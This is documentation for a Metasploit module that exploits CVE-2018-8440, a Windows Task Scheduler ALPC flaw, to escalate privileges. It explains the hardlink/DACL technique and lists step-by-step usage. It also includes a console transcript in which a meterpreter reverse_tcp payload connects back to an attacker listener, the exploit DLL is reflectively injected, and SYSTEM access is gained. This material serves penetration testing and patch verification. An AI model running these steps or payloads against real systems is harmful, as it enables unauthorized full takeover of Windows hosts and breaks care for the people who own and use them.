## Description

On vulnerable versions of Windows the alpc endpoint method SchRpcSetSecurity implemented by the task scheduler service can be used to write arbitrary DACLs to `.job` files located in `c:\windows\tasks` because the scheduler does not use impersonation when checking this location. Since users can create files in the `c:\windows\tasks` folder, a hardlink can be created to a file the user has read access to. After creating a hardlink, the vulnerability can be triggered to set the DACL on the linked file.

WARNING:
The PrintConfig.dll (%windir%\system32\driverstor\filerepository\prnms003*) on the target host
will be overwritten when the exploit runs.

This module has been tested against Windows 10 Pro x64.

## Vulnerable Application

Affected Windows OS versions and related patch details can be found in the [Microsoft Advisory for CVE-2018-8440](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8440).

## Verification Steps

* Get a meterpreter session on Windows 10 x64
* `use exploit/windows/local/alpc_taskscheduler`
* `set session <session>`
* `set payload <payload>`
* `set lhost <lhost>`
* `run`
* Get a session as SYSTEM

## Scenarios

### Tested on Windows 10 Pro Version 1803 x64

```
msf5 > use exploit/windows/local/alpc_taskscheduler
msf5 exploit(windows/local/alpc_taskscheduler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/local/alpc_taskscheduler) > set lhost 172.22.222.136
lhost => 172.22.222.136
msf5 exploit(windows/local/alpc_taskscheduler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  1         shell x64/windows        Microsoft Windows [Version 10.0.17134.228] (c) 2018 Microsoft Corporation. Al...  172.22.222.136:4444 -> 172.22.222.200:50490 (172.22.222.200)
  2         meterpreter x64/windows  DESKTOP-IPOGIJR\lowmsfdev @ DESKTOP-IPOGIJR                                       172.22.222.136:4444 -> 172.22.222.200:50491 (172.22.222.200)

msf5 exploit(windows/local/alpc_taskscheduler) > set session 1
session => 1
msf5 exploit(windows/local/alpc_taskscheduler) > exploit

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 172.22.222.136:4444
[-] Exploit aborted due to failure: none: Only meterpreter sessions are supported
[*] Exploit completed, but no session was created.
msf5 exploit(windows/local/alpc_taskscheduler) > set session 2
session => 2
msf5 exploit(windows/local/alpc_taskscheduler) > exploit

[*] Started reverse TCP handler on 172.22.222.136:4444
[*] Checking target...
[*] Target looks good... attempting the LPE exploit
[+] Process 6140 launched.
[*] Writing payload dll into process 6140 memory
[*] Reflectively injecting the exploit DLL into 6140...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (206403 bytes) to 172.22.222.200
[*] Meterpreter session 3 opened (172.22.222.136:4444 -> 172.22.222.200:50492) at 2018-09-21 12:28:00 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DESKTOP-IPOGIJR
OS              : Windows 10 (Build 17134).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x64/windows
meterpreter > background
[*] Backgrounding session 3...
msf5 exploit(windows/local/alpc_taskscheduler) > set session 3
session => 3
msf5 exploit(windows/local/alpc_taskscheduler) > exploit

[*] Started reverse TCP handler on 172.22.222.136:4444
[*] Checking target...
[-] Exploit aborted due to failure: none: Session is already elevated
[*] Exploit completed, but no session was created.
msf5 exploit(windows/local/alpc_taskscheduler) >
```
